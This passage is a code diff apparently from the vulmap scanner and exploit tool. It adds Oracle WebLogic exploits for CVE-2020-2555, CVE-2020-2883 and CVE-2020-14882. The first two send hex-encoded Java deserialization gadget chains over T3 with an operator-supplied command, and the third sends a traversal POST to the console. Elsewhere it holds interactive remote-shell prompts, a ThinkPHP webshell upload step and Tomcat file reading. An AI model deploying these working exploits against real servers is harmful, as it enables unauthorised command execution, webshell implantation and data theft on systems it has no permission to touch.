+                    '563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c'
+                    '616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f546'
+                    '8726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b00'
+                    '0a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c00147'
+                    '3757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e00087075'
+                    '72001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000'
+                    '000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a'
+                    '6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e000'
+                    '54c000a6d6574686f644e616d6571007e000578700000004374002079736f73657269616c2e7061796c6f6164732e43'
+                    '56455f323032305f323535357400124356455f323032305f323535352e6a6176617400096765744f626a65637473710'
+                    '07e000b0000000171007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e4765'
+                    '6e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266'
+                    'a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200'
+                    '014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f646966696'
+                    '1626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c65'
+                    '6374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697'
+                    'a657870000000007704000000007871007e001a7873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465'
+                    '722e4c696d697446696c74657299022596d7b4595302000649000b6d5f635061676553697a654900076d5f6e5061676'
+                    '54c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f6669'
+                    '6c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f7'
+                    '4746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e0001787000000000000000007372002c636f6d2e74'
+                    '616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f0'
+                    '2000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f'
+                    '73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2'
+                    'f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e75'
+                    '74696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6'
+                    'e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163'
+                    '746f723b2246204735c4a0fe0200007870000000047372002d636f6d2e74616e676f736f6c2e7574696c2e657874726'
+                    '163746f722e4964656e74697479457874726163746f72936ee080c7259c4b0200007871007e0022000000007372002f'
+                    '636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72e'
+                    'e7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c0009'
+                    '6d5f734d6574686f6471007e00057871007e002200000000757200135b4c6a6176612e6c616e672e4f626a6563743b9'
+                    '0ce589f1073296c02000078700000000274000a67657452756e74696d65707400096765744d6574686f647371007e00'
+                    '28000000007571007e002b000000027070740006696e766f6b657371007e0028000000007571007e002b0000000174')
+                self.payload += '{:04x}'.format(len(CMD))
+                self.payload += CMD.encode().hex()
+                self.payload += '7400046578656370767200116a6176612e6c616e672e52756e74696d650000000000000000000000787070'
+                self.payload += ('fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c65536572766963'
+                    '65436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e42617'
+                    '3696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e72'
+                    '6d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757'
+                    '468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b'
+                    '7878fe00ff')
+                self.payload = '%s%s' % ('{:08x}'.format(len(self.payload) // 2 + 4), self.payload)
+                sock.send(bytes.fromhex(self.payload))
+                time.sleep(1)
+                sock.send(bytes.fromhex(self.payload))
+                self.r = "Command Executed Successfully (No Echo)"
+                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except socket.timeout as error:
             verify.timeout_output(self.pocname)
         except Exception as error:
             verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+
+    # 2020-11-06
+    def cve_2020_2883(self):
+        self.pocname = "Oracle Weblogic: CVE-2020-2883"
+        self.info = color.derce()
+        self.method = "giop"
+        self.rawdata = ">_< Vuln CVE-2020-2883 send using giop protocol. So no http request and response"
+        self.r = "PoCWating"
+        try:
+            if VULN is None:
+                self.request = requests.get(self.url + "/console", headers=headers, timeout=TIMEOUT, verify=False)
+                self.v = re.findall("WebLogic Server Version: (.*?)</p>", self.request.text)[0]
+                self.vuln_v = ['10.3.6.0.0','12.1.3.0.0','12.2.1.3.0','12.2.1.4.0']
+                if self.v in self.vuln_v:
+                    self.r = "PoCSuCCeSS"
+                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+                else:
+                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            else:
+                if r"https" in self.url:
+                    sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
+                else:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(TIMEOUT)
+                sock.connect((self.hostname, self.port))
+                sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
+                time.sleep(1)
+                sock.recv(1024)
+                sock.send(bytes.fromhex(self.payload_t3))
+                    #self.resp = sock.recv(4096)
+                    #print(self.resp)
+                self.payload = ('056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000')
+                self.payload += ('aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72c7ad6d3a676f3c180200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f647400124c6a6176612f6c616e672f537472696e673b7871007e000900000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e000d000000007571007e001100000002707571007e001100000000740006696e766f6b657371007e000d000000007571007e00110000000174')
+                self.payload += '{:04x}'.format(len(CMD))
+                self.payload += CMD.encode().hex()
+                self.payload += '74000465786563770400000003767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707400013178'
+                self.payload += ('fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff')
+                self.payload = '%s%s' % ('{:08x}'.format(len(self.payload) // 2 + 4), self.payload)
+                sock.send(bytes.fromhex(self.payload))
+                time.sleep(1)
+                sock.send(bytes.fromhex(self.payload))
+                self.r = "Command Executed Successfully (No Echo)"
+                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+        except socket.timeout as error:
+            verify.timeout_output(self.pocname)
+        except Exception as error:
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+
+    def cve_2020_14882(self):
+        self.pocname = "Oracle WebLogic: CVE-2020-14882"
+        self.info = color.rce()
+        self.method = "post"
+        self.rawdata = "null"
+        self.payload = self.payload_cve_2020_14882_v12
+        self.path = "/console/css/%252e%252e%252fconsole.portal"
+        self.headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
+                  'application/signed-exchange;v=b3;q=0.9',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'zh-CN,zh;q=0.9',
+        'Connection': 'close',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'cmd': CMD
+        }
+        try:
+            self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers,
+                                         timeout=TIMEOUT, verify=False)
+            self.request = requests.post(self.url + self.path, data=self.payload, headers=self.headers,
+                                         timeout=TIMEOUT, verify=False)
+            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+        except requests.exceptions.Timeout as error:
+            verify.timeout_output(self.pocname)
+        except requests.exceptions.ConnectionError as error:
+            verify.connection_output(self.pocname)
+        except Exception as error:
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            
 
 class RedHatJBoss():
     def __init__(self, url):
@@ -13359,6 +13663,10 @@ class RedHatJBoss():
         self.getipport = urlparse(self.url)
         self.hostname = self.getipport.hostname
         self.port = self.getipport.port
+        if self.port == None and r"https://" in self.url:
+            self.port = 443
+        elif self.port == None and r"http://" in self.url:
+            self.port = 80
         if r"https" in self.url:
             self.conn = http.client.HTTPSConnection(self.hostname, self.port)
         else:
@@ -13626,7 +13934,7 @@ class RedHatJBoss():
         except requests.exceptions.ConnectionError as error:
             verify.connection_output(self.pocname)
         except Exception as error:
-            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
 class ThinkPHP():
     def __init__(self, url):
@@ -13666,8 +13974,12 @@ class ThinkPHP():
             self.request = requests.get(self.url + self.payload, headers=headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
             if CMD == "upload":
-                self.filename = input(now.timed(de=DELAY) + color.green("[+] WebShell Name (vulmap.php): "))
-                self.shellpass = input(now.timed(de=DELAY) + color.green("[+] WebShell Password (123456): "))
+                if os_check() == "linux" or os_check() == "other":
+                    self.filename = input(now.timed(de=DELAY) + color.green("[+] WebShell Name (vulmap.php): "))
+                    self.shellpass = input(now.timed(de=DELAY) + color.green("[+] WebShell Password (123456): "))
+                elif os_check() == "windows": 
+                    self.filename = input(now.no_color_timed(de=DELAY) + "[+] WebShell Name (vulmap.php): ")
+                    self.shellpass = input(now.no_color_timed(de=DELAY) + "[+] WebShell Password (123456): ")
                 self.payload = self.payload_cve_2019_9082_webshell.replace("FILENAME", self.filename).replace("SHELLPASS", self.shellpass)
                 self.request = requests.get(self.url + self.payload, headers=headers, timeout=TIMEOUT, verify=False)
                 self.r = "WebShell: " + self.url + "/" + self.filename
@@ -13778,6 +14090,9 @@ class Start(object):
         PocOracleWeblogic.cve_2019_2725()
         PocOracleWeblogic.cve_2019_2729()
         PocOracleWeblogic.cve_2020_2551()
+        PocOracleWeblogic.cve_2020_2555()
+        PocOracleWeblogic.cve_2020_2883()
+        PocOracleWeblogic.cve_2020_14882()
         Start.onepoc_output(self)
     def redhat_jboss(self):
         Start.output(self)
@@ -13815,10 +14130,17 @@ class Start(object):
             
         while True:
             if VULN == "CVE-2016-4437":
-                shiro_key = input(now.timed(de=DELAY)+color.green("[+] key: "))
-                shiro_gadget = input(now.timed(de=DELAY)+color.green("[+] gadget: "))
+                if os_check() == "linux" or os_check() == "other":
+                    shiro_key = input(now.timed(de=DELAY)+color.green("[+] key: "))
+                    shiro_gadget = input(now.timed(de=DELAY)+color.green("[+] gadget: "))
+                elif os_check() == "windows": 
+                    shiro_key = input(now.no_color_timed(de=DELAY)+"[+] key: ")
+                    shiro_gadget = input(now.no_color_timed(de=DELAY)+"[+] gadget: ")
                 while True:
-                    CMD = input(now.timed(de=DELAY) + color.green("[+] Shell >>> "))
+                    if os_check() == "linux" or os_check() == "other":
+                        CMD = input(now.timed(de=DELAY)+color.green("[+] Shell >>> "))
+                    elif os_check() == "windows": 
+                        CMD = input(now.no_color_timed(de=DELAY)+"[+] Shell >>> ")
                     if CMD == "exit" or CMD == "quit" or CMD == "bye": exit(0)
                     global SHIRO_KEY
                     SHIRO_KEY = shiro_key
@@ -13826,10 +14148,17 @@ class Start(object):
                     SHIRO_GADGET = shiro_gadget
                     ExpApacheShiro.cve_2016_4437()
             elif VULN == "CVE-2018-7602":
-                drupal_u = input(now.timed(de=DELAY) + color.green("[+] Input username: "))
-                drupal_p = input(now.timed(de=DELAY) + color.green("[+] Input password: "))
+                if os_check() == "linux" or os_check() == "other":
+                    drupal_u = input(now.timed(de=DELAY) + color.green("[+] Input username: "))
+                    drupal_p = input(now.timed(de=DELAY) + color.green("[+] Input password: "))
+                elif os_check() == "windows": 
+                    drupal_u = input(now.no_color_timed(de=DELAY) + "[+] Input username: ")
+                    drupal_p = input(now.no_color_timed(de=DELAY) + "[+] Input password: ")
                 while True:
-                    CMD = input(now.timed(de=DELAY) + color.green("[+] Shell >>> "))
+                    if os_check() == "linux" or os_check() == "other":
+                        CMD = input(now.timed(de=DELAY)+color.green("[+] Shell >>> "))
+                    elif os_check() == "windows": 
+                        CMD = input(now.no_color_timed(de=DELAY)+"[+] Shell >>> ")
                     if CMD == "exit" or CMD == "quit" or CMD == "bye": exit(0)
                     global DRUPAL_U
                     DRUPAL_U = drupal_u
@@ -13839,17 +14168,27 @@ class Start(object):
             # Apache Tomcat CVE-2020-1938 File reading
             elif VULN == "CVE-2020-1938":
                 print (now.timed(de=DELAY)+color.yeinfo()+color.yellow(" Examples: WEB-INF/web.xml"))
-                CMD = input(now.timed(de=DELAY)+color.green("[+] File >>> "))
+                if os_check() == "linux" or os_check() == "other":
+                    CMD = input(now.timed(de=DELAY)+color.green("[+] File >>> "))
+                elif os_check() == "windows": 
+                    CMD = input(now.no_color_timed(de=DELAY)+"[+] File >>> ")
                 if CMD == "exit" or CMD == "quit" or CMD == "bye": 
                     exit(0)
                 global CVE20201938
                 CVE20201938 = CMD
                 ExpApacheTomcat.cve_2020_1938()
             elif VULN == "CVE-2020-10199":
-                nexus_u = input(now.timed(de=DELAY) + color.green("[+] Input username: "))
-                nexus_p = input(now.timed(de=DELAY) + color.green("[+] Input password: "))
+                if os_check() == "linux" or os_check() == "other":
+                    nexus_u = input(now.timed(de=DELAY) + color.green("[+] Input username: "))
+                    nexus_p = input(now.timed(de=DELAY) + color.green("[+] Input password: "))
+                elif os_check() == "windows": 
+                    nexus_u = input(now.no_color_timed(de=DELAY) + "[+] Input username: ")
+                    nexus_p = input(now.no_color_timed(de=DELAY) + "[+] Input password: ")
                 while True:
-                    CMD = input(now.timed(de=DELAY) + color.green("[+] Shell >>> "))
+                    if os_check() == "linux" or os_check() == "other":
+                        CMD = input(now.timed(de=DELAY)+color.green("[+] Shell >>> "))
+                    elif os_check() == "windows": 
+                        CMD = input(now.no_color_timed(de=DELAY)+"[+] Shell >>> ")
                     if CMD == "exit" or CMD == "quit" or CMD == "bye": exit(0)
                     global NEXUS_U
                     NEXUS_U = nexus_u
@@ -13857,7 +14196,10 @@ class Start(object):
                     NEXUS_P = nexus_p
                     ExpNexus.cve_2020_10199()
             else:
-                CMD = input(now.timed(de=DELAY)+color.green("[+] Shell >>> "))
+                if os_check() == "linux" or os_check() == "other":
+                    CMD = input(now.timed(de=DELAY)+color.green("[+] Shell >>> "))
+                elif os_check() == "windows": 
+                    CMD = input(now.no_color_timed(de=DELAY)+"[+] Shell >>> ")
                 if CMD == "exit" or CMD == "quit" or CMD == "bye": 
                     exit(0)
                 # Apache Shiro ============================
@@ -13933,6 +14275,12 @@ class Start(object):
                 elif VULN == "CVE-2019-2729":
                     print(color.exp_nc())
                     ExpOracleWeblogic.cve_2019_2729()
+                elif VULN == "CVE-2020-2555":
+                    ExpOracleWeblogic.cve_2020_2555()
+                elif VULN == "CVE-2020-2883":
+                    ExpOracleWeblogic.cve_2020_2883()
+                elif VULN == "CVE-2020-14882":
+                    ExpOracleWeblogic.cve_2020_14882()
                 # RedHat JBoss ============================
                 elif VULN == "CVE-2010-0738":
                     ExpRedHatJBoss.cve_2010_0738()
@@ -13978,6 +14326,7 @@ class Target:
         Start.apache_shiro(self)
     def apache_shiro_file(self):
         with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Shiro vulnerability scan"))
             while True:
                 furl = f.readline()
                 furl = furl.strip('\r\n')
@@ -13992,6 +14341,7 @@ class Target:
         Start.apache_solr(self)
     def apache_solr_file(self):
         with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Solr vulnerability scan"))
             while True:
                 furl = f.readline()
                 furl = furl.strip('\r\n')
@@ -14006,6 +14356,7 @@ class Target:
         Start.apache_strtus2(self)
     def apache_struts2_file(self):
         with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Struts2 vulnerability scan"))
             while True:
                 furl = f.readline()
                 furl = furl.strip('\r\n')
@@ -14020,6 +14371,7 @@ class Target:
         Start.apache_tomcat(self)
     def apache_tomcat_file(self):
         with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Apache Tomcat vulnerability scan"))
             while True:
                 furl = f.readline()
                 furl = furl.strip('\r\n')
@@ -14034,6 +14386,7 @@ class Target:
         Start.drupal(self)
     def drupal_file(self):
         with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Drupal vulnerability scan"))
             while True:
                 furl = f.readline()
                 furl = furl.strip('\r\n')
@@ -14048,6 +14401,7 @@ class Target:
         Start.jenkins(self)
     def jenkins_file(self):
         with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Jenkins vulnerability scan"))
             while True:
                 furl = f.readline()
                 furl = furl.strip('\r\n')
@@ -14062,6 +14416,7 @@ class Target:
         Start.nexus(self)
     def nexus_file(self):
         with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Nexus vulnerability scan"))
             while True:
                 furl = f.readline()
                 furl = furl.strip('\r\n')
@@ -14076,7 +14431,9 @@ class Target:
         Start.oracle_weblogic(self)
     def oracle_weblogic_file(self):
         with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run Oracle Weblogic vulnerability scan"))
             while True:
+                
                 furl = f.readline()
                 furl = furl.strip('\r\n')
                 furl = furl.strip()
@@ -14090,6 +14447,7 @@ class Target:
         Start.redhat_jboss(self)
     def redhat_jboss_file(self):
         with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run RedHat JBoss vulnerability scan"))
             while True:
                 furl = f.readline()
                 furl = furl.strip('\r\n')
@@ -14104,6 +14462,7 @@ class Target:
         Start.thinkphp(self)
     def thinkphp_file(self):
         with open(self) as f:
+            print (now.timed(de=DELAY) + color.yeinfo() + color.yellow(" Run ThinkPHP vulnerability scan"))
             while True:
                 furl = f.readline()
                 furl = furl.strip('\r\n')
@@ -14115,9 +14474,8 @@ class Target:
                 Start.thinkphp(furl)
 
 
-
 def version():
-    version = "0.2"
+    version = "0.3"
     github_ver_url = "https://github.com/zhzyker/vulmap/blob/main/version"      
     try:
         github_ver_request = requests.get(url=github_ver_url, timeout=5)
@@ -14133,7 +14491,14 @@ def version():
     except:
         print(now.timed(de=0) + color.rewarn() + color.red(" The current version is: " + version + ", Version check filed"))
 
-                
+def os_check():
+    if platform.system().lower() == 'windows':
+        return "windows"
+    elif platform.system().lower() == 'linux':
+        return "linux"
+    else:
+        return "other"
+
 def cmdlineparser(argv=None):
     print(color.yellow("""                   __
                   [  |                              
@@ -14144,68 +14509,73 @@ def cmdlineparser(argv=None):
                                           [__|"""))
     parser = argparse.ArgumentParser(usage="python3 vulmap [options]")
     # target option
-    target = parser.add_argument_group("Target", "You must use the -u option to specify a target, usually https://example.com or http://example.com:443  Use -u to check one target, use -f to batch check")
+    target = parser.add_argument_group("target", "you must use the -u option to specify a target, usually https://example.com or http://example.com:443  Use -u to check one target, use -f to batch check")
     target.add_argument("-u", "--url",
                         dest="url",
                         type=str,
-                        help=" Target URL (e.g. -u \"http://example.com\")")
+                        help=" target URL (e.g. -u \"http://example.com\")")
     target.add_argument("-f", "--file",
                         dest="file",
-                        help="Select a target list file, and the url must be distinguished by lines (e.g. -f \"/home/user/list.txt\")")
+                        help="select a target list file, and the url must be distinguished by lines (e.g. -f \"/home/user/list.txt\")")
     # poc or exp , target is tomcat or struts
-    mode = parser.add_argument_group("Mode", "Support vulnerability scanning mode and vulnerability exploitation mode, namely \"poc\" and \"exp\"")
+    mode = parser.add_argument_group("mode", "support vulnerability scanning mode and vulnerability exploitation mode, namely \"poc\" and \"exp\"")
     mode.add_argument("-m", "--mode",
                       dest="mode",
                       type=str,
-                      help="The mode supports \"poc\" and \"exp\", you can omit this option, and enter poc mode by default")
+                      help="the mode supports \"poc\" and \"exp\", you can omit this option, and enter poc mode by default")
     mode.add_argument("-a", "--app",
                       dest="app",
                       type=str,
-                      help="Specify a web app or cms (e.g. -a \"weblogic\"). default scan all")
+                      help="specify a web app or cms (e.g. -a \"weblogic\"). default scan all")
     mode.add_argument("-c", "--cmd",
                       dest="cmd",
                       type=str,
                       default="echo VuLnEcHoPoCSuCCeSS",
-                      help="Custom RCE vuln command, Other than \"netstat -an\" and \"id\" can affect program judgment. default is \"netstat -an\"")
+                      help="custom RCE vuln command, default is \"echo VuLnEcHoPoCSuCCeSS\"")
     mode.add_argument("-v", "--vuln",
                       dest="vuln",
                       type=str,
                       default=None,
-                      help="Exploit, Specify the vuln number (e.g. -v \"CVE-2020-2729\")")
+                      help="exploit, specify the vuln number (e.g. -v \"CVE-2020-2729\")")
     mode.add_argument("--list",
                       dest="list",
                       action='store_false',
-                      help="Displays a list of vulnerabilities that support scanning")
+                      help="displays a list of vulnerabilities that support scanning")
     mode.add_argument("--debug",
                       dest="debug",
                       action='store_false',
-                      help="Debug mode echo request and responses")
+                      help="debug mode echo request and responses")
                       
     # time and delay
-    time = parser.add_argument_group("Time", "Check time options")
+    time = parser.add_argument_group("time", "check time options")
     time.add_argument("--delay",
                       dest="delay",
                       type=int,
                       default=0,
-                      help="Delay check time, default 0s")
+                      help="delay check time, default 0s")
     time.add_argument("--timeout",
                       dest="TIMEOUT",
                       type=int,
                       default=10,
-                      help="Scan timeout time, default 10s")
+                      help="scan timeout time, default 10s")
     # output 
-    output = parser.add_argument_group("Output", "Poc mode scan result export")
+    output = parser.add_argument_group("output", "poc mode scan result export")
     output.add_argument("-o", "--output",
                         dest="OUTPUT",
                         type=str,
                         default=None,
                         metavar='FILE',
-                        help="Text mode export (e.g. -o \"result.txt\")")
-    example = parser.add_argument_group("Examples")
+                        help="text mode export (e.g. -o \"result.txt\")")
+    support = parser.add_argument_group("support")
+    support.add_argument(dest="types of vulnerability scanning:\n  "
+                              "shiro, solr, struts2, tomcat, drupal, nexus, weblogic, jboss, thinkphp",
+                         action='store_false')
+    example = parser.add_argument_group("examples")
     example.add_argument(dest="python3 vulmap.py -u http://example.com\n  "
                               "python3 vulmap.py -u http://example.com -a struts2\n  "
                               "python3 vulmap.py -u http://example.com:7001 -m poc -a weblogic --delay 1 --timeout 15\n  "
                               "python3 vulmap.py -u http://example.com:7001 -v CVE-2019-2729\n  "
+                              "python3 vulmap.py -f list.txt -a weblogic\n  "
                               "python3 vulmap.py -f list.txt -o results.txt",
                          action='store_false')
     args = parser.parse_args()
